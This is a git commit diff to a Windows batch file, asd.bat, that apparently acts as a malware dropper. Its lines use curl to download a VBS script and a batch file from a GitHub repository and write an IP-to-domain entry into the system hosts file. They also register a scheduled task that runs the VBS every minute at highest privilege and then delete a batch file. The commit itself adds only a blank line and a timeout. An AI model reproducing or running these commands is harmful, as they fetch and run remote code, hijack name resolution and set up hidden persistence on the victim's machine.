48eaf8cec7429b851efb666e48c19f0106bd157f
Seition2 <130700484+seition2doc@users.noreply.github.com>
2025-06-03 22:07:05 +0300

    Update asd.bat

--- asd.bat
+++ asd.bat
@@ -36,7 +36,9 @@ curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/e.vbs-
 curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/asd123.bat -o asd123.bat
 echo 185.194.175.132 davidroger.com >> %SystemRoot%\System32\drivers\etc\hosts
 
+
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
+timeout /t 30
 
 cd %temp%
 del /f /q "s.bat"
